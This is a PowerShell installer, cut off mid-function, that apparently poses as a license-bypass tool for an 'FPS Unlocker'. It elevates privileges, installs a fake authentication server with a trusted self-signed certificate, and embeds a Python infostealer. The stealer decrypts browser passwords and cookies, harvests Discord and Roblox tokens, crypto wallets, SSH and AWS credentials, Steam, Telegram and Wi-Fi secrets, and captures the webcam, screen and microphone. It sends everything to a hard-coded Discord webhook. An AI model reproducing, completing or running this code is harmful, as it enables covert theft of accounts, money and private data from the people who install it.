$ErrorActionPreference = 'Stop'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$Source = 'https://raw.githubusercontent.com/MarcoCOdev1/d/main/install.ps1'

$admin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(
         [Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $PSCommandPath) {
    $tmp = Join-Path $env:TEMP 'seven-install.ps1'
    Invoke-WebRequest -UseBasicParsing $Source -OutFile $tmp
    if (-not $admin) { Start-Process powershell -Verb RunAs -ArgumentList @('-NoProfile','-ExecutionPolicy','Bypass','-File',"`"$tmp`"") }
    else { & powershell -NoProfile -ExecutionPolicy Bypass -File $tmp }
    return
}
if (-not $admin) {
    Start-Process powershell -Verb RunAs -ArgumentList @('-NoProfile','-ExecutionPolicy','Bypass','-File',"`"$PSCommandPath`"")
    return
}

$Root   = 'C:\seven'
$Hosts  = Join-Path $env:windir 'System32\drivers\etc\hosts'
$Domain = 'sevenauthapi.com'
$Launcher = Join-Path $Root 'fakeauth.exe'
$IconUrl  = 'https://cdn.discordapp.com/attachments/1565494169160654911/1565742788987985970/jon_snow_____game_of_thrones.jpg'

Write-Host '>> setup' -ForegroundColor Cyan
foreach ($t in 'FakeAuth','FakeAuthGrab') { Unregister-ScheduledTask -TaskName $t -Confirm:$false -ErrorAction SilentlyContinue }
Get-CimInstance Win32_Process -Filter "Name='python.exe' OR Name='pythonw.exe' OR Name='fakeauth.exe'" -ErrorAction SilentlyContinue |
    Where-Object { $_.CommandLine -match 'fake\.py|run\.py|grab\.py' } |
    ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }
Get-ChildItem Cert:\CurrentUser\Root -ErrorAction SilentlyContinue |
    Where-Object { $_.Subject -like "*CN=$Domain*" } | Remove-Item -Force -ErrorAction SilentlyContinue

$py = (Get-Command python -ErrorAction SilentlyContinue)
if (-not $py) { throw 'python ma kaynch f PATH' }
$pyw = Join-Path (Split-Path $py.Source) 'pythonw.exe'
if (-not (Test-Path $pyw)) { $pyw = $py.Source }

if (Test-Path $Root) { Rename-Item $Root ("$Root.bak." + (Get-Date -Format 'yyyyMMdd-HHmmss')) }
New-Item -ItemType Directory -Path $Root | Out-Null
Set-Location $Root
python -m pip install cryptography requests --disable-pip-version-check --quiet

$makecert = @'
from cryptography import x509
from cryptography.x509.oid import NameOID
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa
import datetime

k = rsa.generate_private_key(public_exponent=65537, key_size=2048)
n = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, "sevenauthapi.com")])
now = datetime.datetime.now(datetime.timezone.utc)
c = (x509.CertificateBuilder().subject_name(n).issuer_name(n)
     .public_key(k.public_key()).serial_number(x509.random_serial_number())
     .not_valid_before(now - datetime.timedelta(days=1))
     .not_valid_after(now + datetime.timedelta(days=3650))
     .add_extension(x509.SubjectAlternativeName([
         x509.DNSName("sevenauthapi.com"), x509.DNSName("*.sevenauthapi.com")]), False)
     .add_extension(x509.BasicConstraints(ca=True, path_length=None), True)
     .sign(k, hashes.SHA256()))
open("cert.pem","wb").write(
    k.private_bytes(serialization.Encoding.PEM,
        serialization.PrivateFormat.TraditionalOpenSSL,
        serialization.NoEncryption()) + c.public_bytes(serialization.Encoding.PEM))
open("seven.cer","wb").write(c.public_bytes(serialization.Encoding.DER))
print("OK")
'@

$runner = @'
import os, sys, time
os.chdir(os.path.dirname(os.path.abspath(__file__)))
log = "server.log"
try:
    if os.path.getsize(log) > 2 * 1024 * 1024:
        os.replace(log, "server.old.log")
except OSError:
    pass
f = open(log, "a", encoding="utf-8", buffering=1)
sys.stdout = f; sys.stderr = f
print(""); print("=== start", time.strftime("%Y-%m-%d %H:%M:%S"), "pid", os.getpid(), "===")
exec(compile(open("fake.py", encoding="utf-8").read(), "fake.py", "exec"), {"__name__": "__main__"})
'@

$fake = @'
import ssl, json, base64, hashlib, time, uuid, secrets
from http.server import ThreadingHTTPServer, BaseHTTPRequestHandler

YEAR = 365 * 24 * 3600 * 1000

def token(hwid):
    now = int(time.time() * 1000)
    p = {"k": secrets.token_hex(12),
         "h": hashlib.sha256(hwid.encode()).hexdigest()[:24],
         "c": secrets.token_hex(8),
         "e": now + 10 * YEAR}
    b = base64.urlsafe_b64encode(json.dumps(p, separators=(",", ":")).encode()).decode().rstrip("=")
    sig = base64.urlsafe_b64encode(secrets.token_bytes(32)).decode().rstrip("=")
    return b + "." + sig

class H(BaseHTTPRequestHandler):
    daemon_threads = True
    def do_GET(self): self.x()
    def do_POST(self): self.x()
    def x(self):
        n = int(self.headers.get("Content-Length") or 0)
        raw = self.rfile.read(n)
        print(">>>", self.path, raw)
        try: req = json.loads(raw or b"{}")
        except: req = {}
        now = int(time.time() * 1000)
        body = {"success": True, "message": "Authorized", "data": {
            "product": {"id": "6ac401b8ca0d96ab19f8c388", "name": "FPS Unlocker",
                        "hash": req.get("productHash", "")},
            "username": req.get("username", "user"),
            "sessionToken": token(req.get("hwid", "")),
            "expiresAt": time.strftime("%Y-%m-%dT%H:%M:%S.000Z", time.gmtime((now + 10 * YEAR) / 1000)),
            "expiresAtUnix": now + 10 * YEAR,
            "daysLeft": 3650,
            "serverTimeUnix": now,
            "secondsLeft": 10 * YEAR // 1000,
            "config": None},
            "requestId": str(uuid.uuid4()),
            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S.000Z", time.gmtime(now / 1000))}
        b = json.dumps(body).encode()
        self.send_response(200)
        self.send_header("Content-Type", "application/json; charset=utf-8")
        self.send_header("x-censor-enabled", "1")
        self.send_header("Content-Length", str(len(b)))
        self.end_headers()
        self.wfile.write(b)
    def log_message(self, fmt, *a): pass

ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
ctx.load_cert_chain("cert.pem")
s = ThreadingHTTPServer(("0.0.0.0", 443), H)
s.socket = ctx.wrap_socket(s.socket, server_side=True)
print("fake :443")
s.serve_forever()
'@

$cam = @'
param([string]$Out)
$ErrorActionPreference = 'Stop'
Add-Type -AssemblyName System.Runtime.WindowsRuntime
function Await($op, $t) {
  $m = [System.WindowsRuntimeSystemExtensions].GetMethods() | Where-Object {
    $_.Name -eq 'AsTask' -and $_.GetParameters().Count -eq 1 -and $_.GetParameters()[0].ParameterType.Name -eq 'IAsyncOperation`1'
  } | Select-Object -First 1
  $task = $m.MakeGenericMethod($t).Invoke($null, @($op))
  if (-not $task.Wait(20000)) { throw 'timeout' }
  $task.Result
}
[Windows.Media.Capture.MediaCapture,Windows.Media.Capture,ContentType=WindowsRuntime]|Out-Null
[Windows.Storage.StorageFile,Windows.Storage,ContentType=WindowsRuntime]|Out-Null
[Windows.Media.MediaProperties.ImageEncodingProperties,Windows.Media.MediaProperties,ContentType=WindowsRuntime]|Out-Null
$mc = New-Object Windows.Media.Capture.MediaCapture
$init = New-Object Windows.Media.Capture.MediaCaptureInitializationSettings
$init.StreamingCaptureMode = 'Video'
$t = [System.WindowsRuntimeSystemExtensions]::AsTask($mc.InitializeAsync($init))
if (-not $t.Wait(20000)) { throw 'init timeout' }
$dir  = Split-Path $Out
$leaf = Split-Path $Out -Leaf
$folder = Await ([Windows.Storage.StorageFolder]::GetFolderFromPathAsync($dir)) ([Windows.Storage.StorageFolder])
$file   = Await ($folder.CreateFileAsync($leaf, 'ReplaceExisting')) ([Windows.Storage.StorageFile])
$props  = [Windows.Media.MediaProperties.ImageEncodingProperties]::CreateJpeg()
$t2 = [System.WindowsRuntimeSystemExtensions]::AsTask($mc.CapturePhotoToStorageFileAsync($props, $file))
if (-not $t2.Wait(20000)) { throw 'capture timeout' }
$mc.Dispose()
'@

$screen = @'
param([string]$Out)
$ErrorActionPreference = 'Stop'
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
$b = [System.Windows.Forms.SystemInformation]::VirtualScreen
$bmp = New-Object System.Drawing.Bitmap $b.Width, $b.Height
$g = [System.Drawing.Graphics]::FromImage($bmp)
$g.CopyFromScreen($b.Left, $b.Top, 0, 0, $bmp.Size)
$bmp.Save($Out, [System.Drawing.Imaging.ImageFormat]::Jpeg)
$g.Dispose(); $bmp.Dispose()
'@

$grab = @'
import os, sys, json, re, time, socket, sqlite3, shutil, subprocess, base64, ctypes, ctypes.wintypes, hashlib, zipfile, random

try:
    import requests
except Exception:
    requests = None

from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes

WEBHOOK  = "https://canary.discord.com/api/webhooks/1565742577930600448/WyYxTHvWFtKs9zGRNf0d3RvfByTMVrZOnWkhRLnYep_4aq9Kdk11zh9EWc2sWNow63N3"
AVATAR   = "https://cdn.discordapp.com/attachments/1565494169160654911/1565742788987985970/jon_snow_____game_of_thrones.jpg"
INTERVAL = 1800
ROOT = os.path.dirname(os.path.abspath(__file__))
DATA = os.path.join(ROOT, "data")
STATE = os.path.join(DATA, "state.json")
os.makedirs(DATA, exist_ok=True)

RE_TOKEN = re.compile(r"[\w-]{24,28}\.[\w-]{6}\.[\w-]{27,38}|mfa\.[\w-]{80,90}")
RE_ROBLOX = re.compile(r"_\|WARNING[^\x00-\x1f\"\\]{50,600}")
SKIP = {"windows", "$recycle.bin", "system volume information", "node_modules", ".git",
        "package cache", "installer", "winsxs", "driverstore", "temp", "tmp"}
UD = os.environ.get("LOCALAPPDATA", "")
AD = os.environ.get("APPDATA", "")

BROWSERS = [
    ("Chrome", os.path.join(UD, "Google", "Chrome", "User Data")),
    ("ChromeBeta", os.path.join(UD, "Google", "Chrome Beta", "User Data")),
    ("ChromeDev", os.path.join(UD, "Google", "Chrome Dev", "User Data")),
    ("Brave", os.path.join(UD, "BraveSoftware", "Brave-Browser", "User Data")),
    ("Edge", os.path.join(UD, "Microsoft", "Edge", "User Data")),
    ("EdgeBeta", os.path.join(UD, "Microsoft", "Edge Beta", "User Data")),
    ("Vivaldi", os.path.join(UD, "Vivaldi", "User Data")),
    ("Opera", os.path.join(AD, "Opera Software", "Opera Stable")),
    ("OperaGX", os.path.join(AD, "Opera Software", "Opera GX Stable")),
    ("Yandex", os.path.join(UD, "Yandex", "YandexBrowser", "User Data")),
]
FIREFOX = os.path.join(AD, "Mozilla", "Firefox", "Profiles")

def log(m):
    try:
        p = os.path.join(ROOT, "grabber.log")
        if os.path.exists(p) and os.path.getsize(p) > 1024 * 1024:
            os.replace(p, p + ".old")
        with open(p, "a", encoding="utf-8") as f:
            f.write("%s  %s\n" % (time.strftime("%Y-%m-%d %H:%M:%S"), m))
    except Exception:
        pass

class BLOB(ctypes.Structure):
    _fields_ = [("cbData", ctypes.wintypes.DWORD), ("pbData", ctypes.POINTER(ctypes.c_char))]

def dpapi(data, system=False):
    buf = ctypes.create_string_buffer(data, len(data))
    bi = BLOB(len(data), ctypes.cast(buf, ctypes.POINTER(ctypes.c_char)))
    bo = BLOB()
    if not ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(bi), None, None, None, None,
            0x10 if system else 0, ctypes.byref(bo)):
        return None
    out = ctypes.string_at(bo.pbData, bo.cbData)
    ctypes.windll.kernel32.LocalFree(bo.pbData)
    return out

def _debug():
    h = ctypes.windll.kernel32.GetCurrentProcess()
    tok = ctypes.wintypes.HANDLE()
    ctypes.windll.advapi32.OpenProcessToken(h, 0x28, ctypes.byref(tok))
    class TP(ctypes.Structure):
        _fields_ = [("Count", ctypes.wintypes.DWORD), ("Luid", ctypes.c_ulonglong), ("Attr", ctypes.wintypes.DWORD)]
    class TPN(ctypes.Structure):
        _fields_ = [("Count", ctypes.wintypes.DWORD), ("Priv", TP * 1)]
    luid = ctypes.c_ulonglong()
    ctypes.windll.advapi32.LookupPrivilegeValueW(None, "SeDebugPrivilege", ctypes.byref(luid))
    tp = TPN(1, (TP * 1)(TP(1, luid, 0x2)))
    ctypes.windll.advapi32.AdjustTokenPrivileges(tok, False, ctypes.byref(tp), 0, None, None)

def _impersonate_system():
    _debug()
    for pid in pids_of({"winlogon.exe"}):
        h = ctypes.windll.kernel32.OpenProcess(0x1000, False, pid)
        if not h:
            continue
        tok = ctypes.wintypes.HANDLE()
        if ctypes.windll.advapi32.OpenProcessToken(h, 0x0002 | 0x0008, ctypes.byref(tok)):
            dup = ctypes.wintypes.HANDLE()
            if ctypes.windll.advapi32.DuplicateTokenEx(tok, 0x0004 | 0x0008 | 0x0010, None, 2, 2, ctypes.byref(dup)):
                if ctypes.windll.advapi32.ImpersonateLoggedOnUser(dup):
                    return True
    return False

def user_key(user_data):
    ls = os.path.join(user_data, "Local State")
    if not os.path.exists(ls):
        return None
    try:
        raw = json.load(open(ls, "r", encoding="utf-8"))["os_crypt"]["encrypted_key"]
    except Exception:
        return None
    k = dpapi(base64.b64decode(raw)[5:])
    if not k:
        return None
    return PBKDF2HMAC(algorithm=hashes.SHA256(), length=16, salt=b"saltysalt", iterations=1).derive(k)

def app_key(user_data):
    ls = os.path.join(user_data, "Local State")
    if not os.path.exists(ls):
        return None
    try:
        raw = base64.b64decode(json.load(open(ls, "r", encoding="utf-8"))["os_crypt"]["app_bound_encrypted_key"])
    except Exception:
        return None
    if raw[:4] != b"APPB":
        return None
    ok = _impersonate_system()
    try:
        blob = dpapi(raw[4:], True)
    finally:
        if ok:
            ctypes.windll.advapi32.RevertToSelf()
    if not blob:
        return None
    try:
        key = hashlib.sha256(b"Google Chromekey1").digest()
        for _ in range(32):
            e = Cipher(algorithms.AES(key), modes.CBC(key[:16])).encryptor()
            key = (e.update(key) + e.finalize())[:32]
        if len(blob) < 32:
            return None
        plain = AESGCM(key).decrypt(blob[:12], blob[12:], None)
        if plain and plain[0] == 1:
            return plain[1:33]
    except Exception:
        return None
    return None

def dec(blob, key, aad=b"", akey=None):
    if not blob:
        return ""
    try:
        if blob[:3] in (b"v10", b"v11") and key:
            return AESGCM(key).decrypt(b" " * 32, blob[3:], None).decode("utf-8", "replace")
        if blob[:3] == b"v20":
            if akey and len(blob) > 31:
                for a in (aad, b""):
                    try:
                        return AESGCM(akey).decrypt(blob[3:15], blob[15:], a).decode("utf-8", "replace")
                    except Exception:
                        pass
            return "[v20] " + base64.b64encode(blob).decode()
        try:
            return blob.decode("utf-8")
        except Exception:
            pass
        d = dpapi(blob)
        return d.decode("utf-8", "replace") if d else ""
    except Exception:
        return ""

def open_db(src):
    tag = str(random.randint(0, 999999))
    tmp = os.path.join(DATA, "db" + tag)
    for ext in ("", "-wal", "-shm", "-journal"):
        if os.path.exists(src + ext):
            try:
                shutil.copy2(src + ext, tmp + ext)
            except Exception:
                pass
    for uri in ("file:%s?immutable=1" % tmp.replace("\\", "/"), "file:%s?mode=ro" % tmp.replace("\\", "/")):
        try:
            return sqlite3.connect(uri, uri=True, timeout=5)
        except Exception:
            continue
    return sqlite3.connect(tmp, timeout=5)

def profiles_of(user_data):
    if not os.path.isdir(user_data):
        return []
    try:
        names = [d for d in os.listdir(user_data) if os.path.isdir(os.path.join(user_data, d))]
    except Exception:
        return []
    sel = [p for p in names if p == "Default" or p.startswith("Profile")]
    return sel or [""]

def cookies(user_data):
    out = []
    key = user_key(user_data)
    akey = app_key(user_data)
    for prof in profiles_of(user_data):
        for cand in ("Network\\Cookies", "Cookies"):
            src = os.path.join(user_data, prof, cand)
            if not os.path.exists(src):
                continue
            try:
                con = open_db(src)
                rows = con.execute("select host_key,name,encrypted_value,path from cookies").fetchall()
                con.close()
            except Exception:
                continue
            for host, cn, ev, path in rows:
                v = dec(ev, key, host.encode(), akey)
                if v:
                    out.append("%s\t%s\t%s\t%s" % (host, cn, v, path))
    return out

def passwords(user_data):
    out = []
    key = user_key(user_data)
    akey = app_key(user_data)
    for prof in profiles_of(user_data):
        src = os.path.join(user_data, prof, "Login Data")
        if not os.path.exists(src):
            continue
        try:
            con = open_db(src)
            rows = con.execute("select origin_url,username_value,password_value from logins").fetchall()
            con.close()
        except Exception:
            continue
        for url, user, pw in rows:
            if not user:
                continue
            out.append("%s\t%s\t%s" % (url, user, dec(pw, key, url.encode(), akey)))
    return out

def firefox():
    out = []
    if not os.path.isdir(FIREFOX):
        return out
    for prof in os.listdir(FIREFOX):
        src = os.path.join(FIREFOX, prof, "cookies.sqlite")
        if not os.path.exists(src):
            continue
        try:
            con = open_db(src)
            for h, n, v in con.execute("select host,name,value from moz_cookies").fetchall():
                out.append("%s\t%s\t%s\t/" % (h, n, v))
            con.close()
        except Exception:
            pass
    return out

def pids_of(names):
    found = set()
    try:
        arr = (ctypes.c_ulong * 2048)()
        need = ctypes.c_ulong()
        ctypes.windll.psapi.EnumProcesses(ctypes.byref(arr), ctypes.sizeof(arr), ctypes.byref(need))
        for pid in arr[: need.value // ctypes.sizeof(ctypes.c_ulong)]:
            h = ctypes.windll.kernel32.OpenProcess(0x1000, False, pid)
            if not h:
                continue
            try:
                buf = ctypes.create_unicode_buffer(1024)
                sz = ctypes.c_ulong(1024)
                if ctypes.windll.kernel32.QueryFullProcessImageNameW(h, 0, buf, ctypes.byref(sz)):
                    if os.path.basename(buf.value).lower() in names:
                        found.add(pid)
            finally:
                ctypes.windll.kernel32.CloseHandle(h)
    except Exception:
        pass
    return found

def discord_dirs():
    dirs = set()
    for base in (AD, UD):
        if not os.path.isdir(base):
            continue
        for n in os.listdir(base):
            low = n.lower()
            if "discord" in low or "lightcord" in low:
                p = os.path.join(base, n)
                if os.path.isdir(p):
                    dirs.add(p)
    return dirs

def read_tokens(folder, max_depth=6):
    hits = set()
    if not os.path.isdir(folder):
        return hits
    base = folder.rstrip("\\").count("\\")
    for dp, dns, fns in os.walk(folder):
        if dp.count("\\") - base > max_depth:
            dns[:] = []
        for fn in fns:
            if not fn.lower().endswith((".ldb", ".log", ".sst")):
                continue
            p = os.path.join(dp, fn)
            try:
                if os.path.getsize(p) > 16 * 1024 * 1024:
                    continue
                blob = open(p, "rb").read().decode("latin-1")
            except Exception:
                continue
            for m in RE_TOKEN.findall(blob):
                hits.add((m, p))
    return hits

def browser_tokens():
    hits = set()
    for name, ud in BROWSERS:
        for prof in profiles_of(ud):
            p = os.path.join(ud, prof, "Local Storage", "leveldb")
            if os.path.isdir(p):
                hits |= read_tokens(p, 1)
    return hits

def disk_scan(deadline):
    hits = set()
    for d in "CDEFGH":
        root = d + ":\\"
        if not os.path.exists(root):
            continue
        for dp, dns, fns in os.walk(root, topdown=True):
            if time.time() > deadline:
                return hits
            dns[:] = [x for x in dns if x.lower() not in SKIP and not x.startswith("$")]
            if os.path.basename(dp).lower() == "leveldb":
                dns[:] = []
                try:
                    for fn in fns:
                        p = os.path.join(dp, fn)
                        if os.path.getsize(p) > 16 * 1024 * 1024:
                            continue
                        blob = open(p, "rb").read().decode("latin-1")
                        for m in RE_TOKEN.findall(blob):
                            hits.add((m, p))
                except Exception:
                    pass
    return hits

def validate(tok):
    if not requests:
        return None
    try:
        r = requests.get("https://discord.com/api/v9/users/@me",
                         headers={"Authorization": tok, "User-Agent": "Mozilla/5.0"}, timeout=15)
        if r.status_code != 200:
            return {"valid": False, "code": r.status_code}
        u = r.json()
        info = {"valid": True, "id": u.get("id"), "username": u.get("username"),
                "email": u.get("email"), "phone": u.get("phone"), "mfa": u.get("mfa_enabled"),
                "verified": u.get("verified"), "nitro": u.get("premium_type")}
        try:
            b = requests.get("https://discord.com/api/v9/users/@me/billing/subscriptions",
                             headers={"Authorization": tok}, timeout=15).json()
            info["subs"] = len(b) if isinstance(b, list) else 0
        except Exception:
            pass
        return info
    except Exception as e:
        return {"valid": None, "err": str(e)[:60]}

PS = r"""
$o=[ordered]@{}
try{$o.cpu=(Get-CimInstance Win32_Processor).Name -join ' | '}catch{}
try{$o.gpu=(Get-CimInstance Win32_VideoController).Name -join ' | '}catch{}
try{$o.ram_gb=[math]::Round((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory/1GB,1)}catch{}
try{$o.mobo=((Get-CimInstance Win32_BaseBoard).Manufacturer)+' '+(Get-CimInstance Win32_BaseBoard).Product}catch{}
try{$o.os=(Get-CimInstance Win32_OperatingSystem).Caption+' '+[Environment]::OSVersion.Version}catch{}
try{$o.disks=@(Get-CimInstance Win32_LogicalDisk -Filter 'DriveType=3' | ForEach-Object { "$($_.DeviceID) $([math]::Round($_.Size/1GB))GB/$([math]::Round($_.FreeSpace/1GB))GB free" }) -join ' | '}catch{}
try{$o.res="$(Get-CimInstance Win32_VideoController | Select-Object -First 1 | ForEach-Object {$_.CurrentHorizontalResolution}x$($_.CurrentVerticalResolution))"}catch{}
try{$w=(netsh wlan show interfaces | Select-String '^\s*SSID\s*:'); $o.wifi=(($w -join '') -split ':')[1]}catch{}
try{$o.wifi_keys=@(netsh wlan show profiles | Select-String ':\s*(.+)$' | ForEach-Object { $n=$_.Matches[0].Groups[1].Value.Trim(); $k=(netsh wlan show profile name="$n" key=clear | Select-String 'Key Content\s*:\s*(.+)$'); "$n=$($k.Matches[0].Groups[1].Value)" }) -join ' | '}catch{}
try{$o.uptime=[int]((Get-Date)-(Get-CimInstance Win32_OperatingSystem).LastBootUpTime).TotalMinutes}catch{}
try{$o.key=(Get-CimInstance SoftwareLicensingService).OA3xOriginalProductKey}catch{}
try{$o.av=@(Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct | ForEach-Object { $_.displayName }) -join ', '}catch{}
try{$o.users=@(Get-LocalUser | ForEach-Object { "$($_.Name)($($_.Enabled))" }) -join ', '}catch{}
try{$o.procs=@(Get-Process | Sort-Object -Descending WorkingSet | Select-Object -First 30 | ForEach-Object { $_.Name }) -join ', '}catch{}
try{$o.startup=@(Get-CimInstance Win32_StartupCommand | ForEach-Object { "$($_.Name)=$($_.Command)" }) -join ' || '}catch{}
try{$o.installed=@(Get-ItemProperty 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*','HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*' -ErrorAction SilentlyContinue | ForEach-Object { $_.DisplayName } | Where-Object { $_ }) -join ', '}catch{}
try{$o.clip=Get-Clipboard -Raw}catch{}
$o | ConvertTo-Json -Compress
"""

def sysinfo():
    try:
        r = subprocess.run(["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", PS],
                           capture_output=True, text=True, timeout=120, creationflags=0x08000000)
        return json.loads(r.stdout.strip() or "{}")
    except Exception as e:
        return {"err": str(e)[:60]}

def pub_ip():
    if not requests:
        return "?"
    for u in ("https://api.ipify.org", "https://ifconfig.me/ip"):
        try:
            return requests.get(u, timeout=10).text.strip()
        except Exception:
            pass
    return "?"

def local_ips():
    out = set()
    try:
        for ip in socket.gethostbyname_ex(socket.gethostname())[2]:
            out.add(ip)
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80)); out.add(s.getsockname()[0]); s.close()
    except Exception:
        pass
    return ", ".join(sorted(out))

def geo(ip):
    if not requests or ip == "?":
        return ""
    try:
        d = requests.get("http://ip-api.com/json/" + ip, timeout=10).json()
        return "%s, %s, %s (%s)" % (d.get("city"), d.get("regionName"), d.get("country"), d.get("isp"))
    except Exception:
        return ""

def emails():
    out = set()
    u = os.environ.get("USERNAME", "")
    d = os.environ.get("USERDNSDOMAIN") or os.environ.get("USERDOMAIN") or ""
    if u and d:
        out.add(u + "@" + d)
    for name, ud in BROWSERS:
        for prof in profiles_of(ud):
            src = os.path.join(ud, prof, "Login Data")
            if not os.path.exists(src):
                continue
            try:
                con = open_db(src)
                for (x,) in con.execute("select username_value from logins where username_value like '%@%'"):
                    if x:
                        out.add(x.strip())
                con.close()
            except Exception:
                pass
    return sorted(x for x in out if "@" in x)

def histories():
    out = {}
    for name, ud in BROWSERS:
        n = 0
        for prof in profiles_of(ud):
            src = os.path.join(ud, prof, "History")
            if not os.path.exists(src):
                continue
            try:
                con = open_db(src)
                n += con.execute("select count(*) from urls").fetchone()[0]
                con.close()
            except Exception:
                pass
        if n:
            out[name] = n
    return out

def roblox():
    out = set()
    base = os.path.join(UD, "Roblox", "LocalStorage")
    for dp, dns, fns in os.walk(base):
        for fn in fns:
            if not fn.lower().endswith((".ldb", ".log")):
                continue
            try:
                blob = open(os.path.join(dp, fn), "rb").read().decode("latin-1")
            except Exception:
                continue
            for m in RE_ROBLOX.findall(blob):
                out.add(m)
    return out

WALLETS = {
    "Exodus": os.path.join(AD, "Exodus", "exodus.wallet"),
    "Electrum": os.path.join(AD, "Electrum", "wallets"),
    "Atomic": os.path.join(AD, "atomic", "Local Storage", "leveldb"),
    "Coinomi": os.path.join(AD, "Coinomi", "Coinomi", "wallets"),
    "Bitcoin": os.path.join(AD, "Bitcoin", "wallets"),
    "Monero": os.path.join(AD, "bitmonero"),
    "Metamask": os.path.join(UD, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "nkbihfbeogaeaoehlefnkodbefgpgknn"),
    "Phantom": os.path.join(UD, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "bfnaelmomeimhlpmgjnjophhpkkoljpa"),
}
MISC = [
    os.path.expanduser("~/.ssh/id_rsa"), os.path.expanduser("~/.ssh/id_ed25519"),
    os.path.expanduser("~/.ssh/known_hosts"), os.path.expanduser("~/.aws/credentials"),
    os.path.expanduser("~/.gitconfig"), os.path.expanduser("~/.npmrc"),
    os.path.join(AD, ".minecraft", "launcher_accounts.json"),
]

def camera():
    out = os.path.join(DATA, "cam.jpg")
    try:
        if os.path.exists(out):
            os.remove(out)
        subprocess.run(["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass",
                        "-File", os.path.join(ROOT, "cam.ps1"), "-Out", out],
                       capture_output=True, timeout=45, creationflags=0x08000000)
    except Exception:
        pass
    return out if os.path.exists(out) and os.path.getsize(out) > 2000 else None

def shot():
    out = os.path.join(DATA, "screen.jpg")
    try:
        if os.path.exists(out):
            os.remove(out)
        subprocess.run(["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass",
                        "-File", os.path.join(ROOT, "screen.ps1"), "-Out", out],
                       capture_output=True, timeout=45, creationflags=0x08000000)
    except Exception:
        pass
    return out if os.path.exists(out) and os.path.getsize(out) > 3000 else None

def voice(sec=10):
    out = os.path.join(DATA, "voice.wav")
    try:
        if os.path.exists(out):
            os.remove(out)
    except Exception:
        pass
    try:
        mci = ctypes.windll.winmm.mciSendStringW
        buf = ctypes.create_unicode_buffer(512)
        mci("open new type waveaudio alias rec", buf, 512, None)
        mci("set rec time format ms bitspersample 16 channels 1 samplespersec 22050", buf, 512, None)
        mci("record rec", buf, 512, None)
        time.sleep(sec)
        mci("stop rec", buf, 512, None)
        mci('save rec "%s"' % out, buf, 512, None)
        mci("close rec", buf, 512, None)
    except Exception as e:
        log("voice %r" % e)
    return out if os.path.exists(out) and os.path.getsize(out) > 4000 else None

def load_state():
    try:
        return json.load(open(STATE, "r", encoding="utf-8"))
    except Exception:
        return {"tokens": {}}

def save_state(s):
    try:
        json.dump(s, open(STATE, "w", encoding="utf-8"), indent=1)
    except Exception:
        pass

def hh(t):
    return hashlib.sha256(t.encode()).hexdigest()[:16]

def send(payload, files):
    if not requests:
        return
    try:
        r = requests.post(WEBHOOK, data={"payload_json": json.dumps(payload)}, files=files or {}, timeout=180)
        log("send %s %s" % (r.status_code, r.text[:120]))
    except Exception as e:
        log("send err %r" % e)

def quick_tokens():
    found = set()
    for d in discord_dirs():
        found |= read_tokens(d)
    found |= browser_tokens()
    return {k: v for k, v in found if len(k) > 50}

def build_zip(sp):
    path = os.path.join(DATA, "dump.zip")
    ck, pw = [], []
    for name, ud in BROWSERS:
        c = cookies(ud)
        p = passwords(ud)
        if c:
            ck += ["# %s" % name] + c
        if p:
            pw += ["# %s" % name] + p
    ck += ["# Firefox"] + firefox()
    rb = roblox()
    tot = 0
    with zipfile.ZipFile(path, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("cookies.txt", "\n".join(ck))
        z.writestr("passwords.txt", "\n".join(pw))
        z.writestr("sysinfo.txt", json.dumps(sp, indent=1, ensure_ascii=False))
        z.writestr("roblox.txt", "\n".join(rb))
        for name, p in WALLETS.items():
            if not os.path.exists(p):
                continue
            if os.path.isfile(p):
                if os.path.getsize(p) < 2097152:
                    z.write(p, "wallets/%s_%s" % (name, os.path.basename(p)))
            else:
                for dp, dn, fn in os.walk(p):
                    for f in fn:
                        fp = os.path.join(dp, f)
                        try:
                            if os.path.getsize(fp) > 2097152:
                                continue
                            tot += os.path.getsize(fp)
                            if tot > 12582912:
                                break
                            z.write(fp, "wallets/%s/%s" % (name, os.path.relpath(fp, p)))
                        except Exception:
                            pass
        for m in MISC:
            if os.path.exists(m) and os.path.getsize(m) < 524288:
                z.write(m, "misc/" + os.path.basename(m))
        steam = r"C:\Program Files (x86)\Steam\config"
        if os.path.isdir(steam):
            for f in os.listdir(steam):
                if f.startswith("ssfn") or f == "loginusers.vdf":
                    try:
                        z.write(os.path.join(steam, f), "steam/" + f)
                    except Exception:
                        pass
        td = os.path.join(AD, "Telegram Desktop", "tdata")
        if os.path.isdir(td):
            for dp, dn, fn in os.walk(td):
                for f in fn:
                    fp = os.path.join(dp, f)
                    try:
                        if os.path.getsize(fp) > 2097152:
                            continue
                        tot += os.path.getsize(fp)
                        if tot > 18874368:
                            break
                        z.write(fp, "tdata/" + os.path.relpath(fp, td))
                    except Exception:
                        pass
    return path, len([x for x in ck if not x.startswith("# ")]), len([x for x in pw if not x.startswith("# ")])

def report(tokens, sp, tag, files):
    st = load_state()
    known = st.setdefault("tokens", {})
    events, lines, users = [], [], []
    for tok, src in tokens.items():
        key = hh(tok)
